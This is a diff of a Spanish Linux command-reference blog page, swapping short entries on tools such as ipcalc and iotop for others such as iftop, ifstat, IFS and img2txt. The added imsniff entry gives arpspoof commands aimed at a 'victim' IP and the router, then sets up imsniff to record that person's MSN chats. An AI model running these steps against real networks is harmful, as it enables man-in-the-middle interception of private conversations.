@@ -9,8 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="Calcular las ips y mascaras de una red a partir de una ip dada o un rango. # ipcalc 192.168.0.1/24 # ipcalc 192.168.0.1/255.255.128.0
-">
+  <meta name="description" content="Capturar paquetes relacionados con el protocolo MSN . Su uso pasa por el envenenamiento arp, situando nuestra máquina entre la victima y el router &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -81,7 +80,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/ipcalc/">Ipcalc</a></h1>
+      <h1 class="entry-title"><a href="/blog/imsniff/">Imsniff</a></h1>
     
     
       <p class="meta">
@@ -97,18 +96,50 @@
   
 
 
-<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:11:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Calcular las ips y mascaras de una red a partir de una ip dada o un rango.</p>
+  <div class="entry-content"><p>Capturar paquetes relacionados con el protocolo MSN . Su uso pasa por el envenenamiento arp, situando nuestra máquina entre la victima y el router lanzando en varias terminales y sin cerrarlas:</p>
 
-<blockquote><p># ipcalc 192.168.0.1/24</p>
+<blockquote><p># arpspoof -i eth0 -t 192.168.1.15 192.168.1.1</p>
 
-<p># ipcalc 192.168.0.1/255.255.128.0</p></blockquote>
+<p># arpspoof -i eth0 -t 192.168.1.1 192.168.1.15</p></blockquote>
+
+<p>Activar forwarding para que los paquetes vayan a su verdadero dueño:</p>
+
+<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Crear una carpeta donde guardar los datos:</p>
+
+<blockquote><p>$ mkdir snifadas</p></blockquote>
+
+<p>Modificar el archivo de configuración a partir de la  propia documentación ::</p>
+
+<blockquote><p># cp /usr/share/doc/imsniff/examples/imsniff.conf.sample /etc/imsniff.conf</p>
+
+<p># nano /etc/imsniff.conf</p></blockquote>
+
+<p>daemonize = 0</p>
+
+<p>promisc = 0</p>
+
+<p>verbose = 2</p>
+
+<p>chatdir = /home/USER/snifadas/chats</p>
+
+<p>debugdir = /home/USER/snifadas/debug</p>
+
+<p>interface eth0</p>
+
+<p>Los directorios &#8220;chats&#8221; y &#8220;debug&#8221; los crea la misma aplicación.</p>
+
+<p>Lanzar el sniffer de conversaciones msn:</p>
+
+<blockquote><p># imsniff</p></blockquote>
 </div>
   
   
@@ -121,7 +152,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/ipband/">Ipband</a></h1>
+      <h1 class="entry-title"><a href="/blog/impressive/">Impressive</a></h1>
     
     
       <p class="meta">
@@ -137,47 +168,32 @@
   
 
 
-<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:11:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Mostrar datos de la conexión. Copiar el arxivo de configuración:</p>
+  <div class="entry-content"><p>Visualizar documentos PDF e imágenes (jpg, tiff, png&#8230;)</p>
 
-<blockquote><p># cp /usr/share/doc/ipband/examples/ipband.conf-simple /etc/ipband.conf</p></blockquote>
+<blockquote><p>$ impressive documento.pdf</p>
 
-<p>Y descomentar o modificar los siguientes parámetros:</p>
+<p>$ impressive -l    (lista efectos disponibles)</p>
 
-<pre><code>debug 0
+<p>$ impressive -t SqueezeLeft documento.pdf</p></blockquote>
 
-interface eth1
+<p>Algunas opciones:</p>
 
-fork yes
+<p>AvPág          Va a la página siguientes</p>
 
-htmlfile /srv/www/htdocs/ipbandwidth/index.html
+<p>RePág          Va a la página anterior</p>
 
-htmltitle Consumo de banda
+<p>z                  zoom donde esté el cursor</p>
 
-average 10
+<p>f                   Activa/Desactiva la pantalla completa</p>
 
-accumulate no
-
-maskbits 32
-
-localrange 192.168.1.0/24
-</code></pre>
-
-<p>Reiniciar el servicio:</p>
-
-<blockquote><p># /etc/init.d/ipband restart</p></blockquote>
-
-<p>Arrancar la aplicación:</p>
-
-<blockquote><p># ipband</p></blockquote>
-
-<p>Los informes se muestran poniendo en la barra del navegador: http://localhost/html/ipbandwidth/index.html</p>
+<p>q                  Salir de la aplicación</p>
 </div>
   
   
@@ -190,7 +206,7 @@ localrange 192.168.1.0/24
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/ip-ajustes/">Ip-ajustes</a></h1>
+      <h1 class="entry-title"><a href="/blog/import/">Import</a></h1>
     
     
       <p class="meta">
@@ -206,35 +222,26 @@ localrange 192.168.1.0/24
   
 
 
-<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:11:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>1.- Estática</p>
+  <div class="entry-content"><p>[imagemagick]. Capturar la pantalla en cualquier formato.</p>
 
-<blockquote><p># gedit /etc/network/interfaces</p></blockquote>
+<blockquote><p>$ import -window root captura.png (captura de pantalla completa)</p>
 
-<pre><code>auto eth0
+<p>$ import -window <code>xwininfo | awk '/Window id/{print $4; exit}'</code> <code>uuidgen</code>.png (Lo mismo. El puntero se convierte en una cruz y captura el esritorio donde se clica)</p>
 
-iface eth0 inet static
+<p>$ import captura.png (captura de un área concreta))</p>
 
-address 192.168.x.x
+<p>$ import 2 captura.png (realizar 2 capturas)</p>
 
-netmask 255.255.255.0
+<p>$ import -pause 5 captura.png (Para retardar la captura 5 segundos)</p>
 
-network 192.168.x.0
-
-boadcast 192.168.2.255
-
-gateway 192.168.x.1
-</code></pre>
-
-<blockquote><p># /etc/init.d/networking restart (reiniciar el servicio)</p>
-
-<p>$ ifconfig (verificar la nueva ip)</p></blockquote>
+<p>$ import -geometry 250×250! captura.png (indicando un tamaño respetando las proporciones)</p></blockquote>
 </div>
   
   
@@ -247,7 +254,7 @@ gateway 192.168.x.1
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/ip/">Ip</a></h1>
+      <h1 class="entry-title"><a href="/blog/img2txt/">Img2txt</a></h1>
     
     
       <p class="meta">
@@ -263,42 +270,18 @@ gateway 192.168.x.1
   
 
 
-<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:11:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>(comando). Configuración de red. Muestra dispositivos, enrutamientos, tuneles.</p>
+  <div class="entry-content"><p>[caca-utils, libcaca]. Pasar una imagen a ascii.</p>
 
-<blockquote><p>$ ip addr (Revisar tarjetas)</p>
+<blockquote><p>$ img2txt -f svg imagen.jpg > imagen.svg</p>
 
-<p>$ ip route show (Información)</p>
-
-<p>$ ip link show (Ver interfaces de red)</p>
-
-<p>$ ip link set dev eth0 down (bajar una red)</p>
-
-<p>$ ip route add default via 192.168.1.1 (establecer la ip del router)</p>
-
-<p>$ ip link set dev eth0 up (levantar una red)</p>
-
-<p>$ ip addr add 192.168.1.20 255.255.255.0 dev eth1 (establecer una ip estática)</p>
-
-<p>$ ip n  (MAC e IP del router)</p>
-
-<p>$ ip link set dev eth1 address 00:03:44:88:00:11 (Modificdar la MAC. Previamente bajar la red)</p>
-
-<p>$ ip route del default (Eliminar puerta de enlace para crear una nueva)</p>
-
-<p>$ ip route add default via 192.168.1.10 (Crear nueva puerta de enlace)</p>
-
-<p>$ ip -f inet addr show eth0 (información de la dirección ip)</p>
-
-<p>$ ip route add 192.168.2.0/24 via 192.168.1.10 (Añadir una red a una puerta de enlace)</p></blockquote>
-
-<p>Nota.- Verificar que /etc/resolv contenga una linea con el servidor DNS tipo: nameserver 8.8.8.8 [para las DNS de google]</p>
+<p>$ img2txt -f html imagen.jpg > imagen.html (código html de la imagen)</p></blockquote>
 </div>
   
   
@@ -311,7 +294,7 @@ gateway 192.168.x.1
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/iozone/">Iozone</a></h1>
+      <h1 class="entry-title"><a href="/blog/ifup/">Ifup</a></h1>
     
     
       <p class="meta">
@@ -327,28 +310,16 @@ gateway 192.168.x.1
   
 
 
-<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:11:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Realizar test de velocidad de sistemas de archivos (ext3, ext4&#8230;)</p>
+  <div class="entry-content"><p>Habilita la interfase especificada:</p>
 
-<blockquote><p>$ iozone -s 2g -r 64 -i 0 -i 1 -b test.xls</p>
-
-<p>$ iozone -a -g 2G -f /media/sda2</p></blockquote>
-
-<p>-a (automático)</p>
-
-<p>-g (Tamaño de los archivos generados)</p>
-
-<p>-f (el sistema de archivos a tratar)</p>
-
-<p>-i (0= escritura, 1= lectura, 2=lectura/escritura&#8230;.)</p>
-
-<p>-b (archivo que generará con los resultados)</p>
+<blockquote><p>$ ifup eth0</p></blockquote>
 </div>
   
   
@@ -361,7 +332,7 @@ gateway 192.168.x.1
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/iotop/">Iotop</a></h1>
+      <h1 class="entry-title"><a href="/blog/iftop/">Iftop</a></h1>
     
     
       <p class="meta">
@@ -377,32 +348,16 @@ gateway 192.168.x.1
   
 
 
-<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:11:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>monitoriza el ratio de lectura/escritura en disco .</p>
+  <div class="entry-content"><p>Muestra el ancho de banda que está usando una red.</p>
 
-<blockquote><p>$ iotop -o -u usuario</p>
-
-<p>$ iotop -a -p $(sed &#8216;s, , -p ,g&#8217; &lt;&lt;&lt;<code>pgrep "_raid|_resync|jbd2"</code>) (un raid)</p></blockquote>
-
-<p>Alguns opciones:</p>
-
-<p>-d 2 (Actualización cada 2 segundos)</p>
-
-<p>-b (No interactivo)</p>
-
-<p>-o (Sólo mostrar procesos que hacen uso de entrada/salida)</p>
-
-<p>-t (Incluir una marca de tiempo)</p>
-
-<p>-p pid (Pid del proceso a monitorizar. Por defecto todos)</p>
-
-<p>-u usuario (especificando usuario)</p>
+<blockquote><p># iftop -nP -i eth0 (sin resolver las IPs[n], mostrando puerto[P] y especificando red)</p></blockquote>
 </div>
   
   
@@ -415,7 +370,7 @@ gateway 192.168.x.1
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/iostat/">Iostat</a></h1>
+      <h1 class="entry-title"><a href="/blog/ifstat/">Ifstat</a></h1>
     
     
       <p class="meta">
@@ -431,20 +386,28 @@ gateway 192.168.x.1
   
 
 
-<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:11:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>muestra estadísticas de la CPU y de la entrada y salida de los dispositivos y particiones.</p>
+  <div class="entry-content"><p>Monitorización del trafico de red.</p>
 
-<blockquote><p>$ iostat -x sda -d 1 6 (6 reportes con 1 segundo de intervalo sobre el disco sda. Suprimiendo la última cifra [6] continuará reportando datos hasta finalizar con Ctrl+c)</p>
+<blockquote><p>$ ifstat -z (Descarta los interfaces sin actividad)</p>
 
-<p>$ iostat -d 3 (actualizará resultados cada 3 segundos)</p>
+<p>$ ifstat -i eth1 (Especificando una red)</p></blockquote>
 
-<p>$ iostat -p sda (Ver estadisticas de un disco concreto con sus particiones)</p></blockquote>
+<p>Algunas opciones:</p>
+
+<p>-a (Muestra todas las redes)</p>
+
+<p>-T (monitorizando varias redes, muestra el total)</p>
+
+<p>-S (Muestra los resultados en la misma linea, si es posible)</p>
+
+<p>-b (Reporta los informes en Kbits / seg en lugar de kbytes / seg.)</p>
 </div>
   
   
@@ -457,7 +420,7 @@ gateway 192.168.x.1
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/inxi/">Inxi</a></h1>
+      <h1 class="entry-title"><a href="/blog/ifs/">Ifs</a></h1>
     
     
       <p class="meta">
@@ -473,162 +436,66 @@ gateway 192.168.x.1
   
 
 
-<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:11:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Muestra información del equipo (<a href="http://inxi.googlecode.com/svn/trunk/inxi">http://inxi.googlecode.com/svn/trunk/inxi</a>).</p>
+  <div class="entry-content"><p>Internal Field Separator (separador de campos internos) sirve para indicar cual es el valor que se usa como separador. Si no se especifica ninguno es el espacio.</p>
 
-<blockquote><p>$ inxi -Fpur -c 4</p></blockquote>
-
-<p>Algunas opciones (con inxi -h la lista completa):</p>
-
-<pre><code>-A (Audio y tarjetas de sonido)
-
--b (informacio básica)
-
--c (formato de color de 0 a 32 para la salida de datos)
-
--C (CPUs)
-
--d (drivers opticos)
-
--D (disco duro)
-
--F (salida extendida)
-
--G (tarjeta gráfica)
-
--i (Información de red)
-
--I (Procesos, uptime, memoria...)
-
--M (Datos de la máquina)
-
--N (    tarjetas de red)
-
--o (particiones no montadas)
-
--p (particiones montadas)
-
--r (repositorios)
-
--s (sensors[temperaturas cpu])
-
--S  (Host, Kernel,Escritorio y Distro)
-
--t cm (Procesos que consumen más cpu [c] y memoria [m])
-
--u (UUID de las particiones. -uo las no montadas, -up las montadas)
-
--v 6 (Distintas etiquetas de información. Del 1 al 6)
-</code></pre>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/interfaces/">Interfaces</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Archivo de configuración de la red en distros debian.</p>
+<p>Algunos ejemplos:</p>
 
 <p>1.-</p>
 
-<p>Con IP dinámica:</p>
+<pre><code>#!/bin/bash
 
-<p>Colocar en el archivo las lineas:</p>
+# dividir una IP en 4 variables
 
-<pre><code>auto eth0
+# Guardar el separador de campos original
 
-iface eth0 inet dhcp
+OLDIFS=$IFS
+
+read -p "Dime la ip: " IP
+
+# Establecemos el separador de campos en el punto
+
+IFS=.
+
+read IP1 IP2 IP3 IP4 &lt;&lt;&lt; "$IP"
+
+echo "$IP1 $IP2 $IP3 $IP4"
+
+# Restablecemos el separador original (El espacio)
+
+IFS=$OLDIFS
 </code></pre>
 
 <p>2.-</p>
 
-<p>Con IP fija</p>
+<pre><code>#!/bin/bash
 
-<p>Colocar en el archivo las lineas:</p>
+#Almacenamos el valor original de la variable IFS
 
-<pre><code>auto eth0
+OLDIFS=$IFS
 
-iface eth0 inet static
+#Cambiamos el valor del IFS a final de linea [\n]
 
-address 192.168.1.10
+IFS=$'\n'
 
-gateway 192.168.1.1
+for line in $(cat file.txt)
 
-netmask 255.255.255.0
+do
 
-broadcast 192.168.1.255
+    echo $line
+
+done
+
+#Restauramos el IFS
+
+IFS=$OLDIFS
 </code></pre>
-
-<p>Reiniciar el servicio:</p>
-
-<blockquote><p># ifdown eth0</p>
-
-<p># ifup eth0</p></blockquote>
-
-<p>Nota.- Solo modificandolo en network-manager no funciona.</p>
-
-<p>3.-</p>
-
-<p>Creación de una segunda dirección IP virtual.</p>
-
-<p>Añadir las siguientes lineas a las de la IP fija:</p>
-
-<pre><code>auto eth0:1
-
-iface eth0:1 inet static
-
-address 192.168.0.15
-
-netmask 255.255.255.0
-
-broadcast 192.168.0.255
-
-gateway 192.168.0.1
-</code></pre>
-
-<p>Nota.- La instalación de nerwork-manager o wicd para la gestión de redes implica comentar las modificaciones de este archivo o en, en el caso de network-manager, editar:</p>
-
-<blockquote><p># nano  /etc/NetworkManager/NetworkManager.conf</p></blockquote>
-
-<p>Y modificar la linea:</p>
-
-<p>[ifupdown]</p>
-
-<p>managed=true</p>
 </div>
   
   
@@ -641,7 +508,7 @@ gateway 192.168.0.1
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/integrit/">Integrit</a></h1>
+      <h1 class="entry-title"><a href="/blog/ifne/">Ifne</a></h1>
     
     
       <p class="meta">
@@ -657,57 +524,58 @@ gateway 192.168.0.1
   
 
 
-<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:11:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Detectar cuando algún archivo del sistema ha sido alterado mediante la creación, la primera vez que se lanza, de una base de datos con la que confrontar los nuevos escaneos.</p>
+  <div class="entry-content"><p>[moreutils]. Se ejecuta si la entrada estandar no está vacia.</p>
 
-<p>Configuración:</p>
+<blockquote><p>$ find . -name archivo | ifne echo &#8220;Existe&#8221; (Si &#8220;archivo&#8221; existe se ejecutará el echo. Si no existe, no)</p>
 
-<blockquote><p># /etc/integrit/integrit.con</p></blockquote>
+<p>$ find . -name archivo | ifne -n echo &#8220;No existe&#8221; (Si &#8220;archivo&#8221; no existe se ejecutará el echo. Si existe, no)</p></blockquote>
+</div>
+  
+  
 
-<p>Descomentar las lineas:</p>
 
-<pre><code>root=/
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/ifdown/">Ifdown</a></h1>
+    
+    
+      <p class="meta">
+        
 
-known=/var/lib/integrit/known.cdb
 
-current=/var/lib/integrit/current.cdb
-</code></pre>
 
-<p>Y descartar los directorios que no se deseen incluir en el escaneo, descomentandolos [&#8220;cdrom&#8221; se descarta, &#8220;/dev&#8221; se escane, &#8220;/usr/src&#8221; no se escaneará de forma recursiva ]:</p>
 
-<pre><code>!/cdrom
 
-# !/dev
 
-=/usr/src
-</code></pre>
 
-<p>Crear la base de datos inicial:</p>
 
-<blockquote><p># integrit -u -C /etc/integrit/integrit.conf</p></blockquote>
+  
 
-<p>Mover la base de datos a know.cdb:</p>
 
-<blockquote><p># mv /var/lib/integrit/current.cdb /var/lib/integrit/known.cdb</p></blockquote>
+<time datetime="2014-06-07T07:11:00+02:00" pubdate data-updated="true">07-06-2014</time>
+        
+      </p>
+    
+  </header>
 
-<p>Lanzar la comprobación:</p>
 
-<blockquote><p># integrit -C /etc/integrit/integrit.conf -c</p></blockquote>
+  <div class="entry-content"><p>Deshabilita la interfase especificada:</p>
 
-<p>Si queremos colocar la orden en el cron para ser lanzada cada hora y que envie un correo al administrador:</p>
+<blockquote><p># ifdown eth0</p>
 
-<blockquote><p># crontab -e</p></blockquote>
-
-<p>Y colocamos la linea:</p>
-
-<pre><code>* 1 * * * integrit -C /etc/integrit/integrit.conf -c | mail root
-</code></pre>
+<p># ifdown -a (Deshabilita todas las redes)</p></blockquote>
 </div>
   
   
@@ -738,43 +606,43 @@ current=/var/lib/integrit/current.cdb
   <ul id="recent_posts">
     
       <li class="post">
-        <a href="/blog/nmap/">nmap</a>
+        <a href="/blog/zypper/">zypper</a>
       </li>
     
       <li class="post">
-        <a href="/blog/nethogs/">nethogs</a>
+        <a href="/blog/zmore/">zmore</a>
       </li>
     
       <li class="post">
-        <a href="/blog/lilo/">lilo</a>
+        <a href="/blog/zmap/">zmap</a>
       </li>
     
       <li class="post">
-        <a href="/blog/anarchism/">anarchism</a>
+        <a href="/blog/zless/">zless</a>
       </li>
     
       <li class="post">
-        <a href="/blog/sftp/">sftp</a>
+        <a href="/blog/zip/">zip</a>
       </li>
     
       <li class="post">
-        <a href="/blog/logrotate/">logrotate</a>
+        <a href="/blog/zgrep/">zgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/ssh/">ssh</a>
+        <a href="/blog/zfgrep/">zfgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/lshell/">lshell</a>
+        <a href="/blog/zenity/">zenity</a>
       </li>
     
       <li class="post">
-        <a href="/blog/apt-mirror/">apt-mirror</a>
+        <a href="/blog/zegrep/">zegrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/typeset/">typeset</a>
+        <a href="/blog/zdump/">zdump</a>
       </li>
     
   </ul>
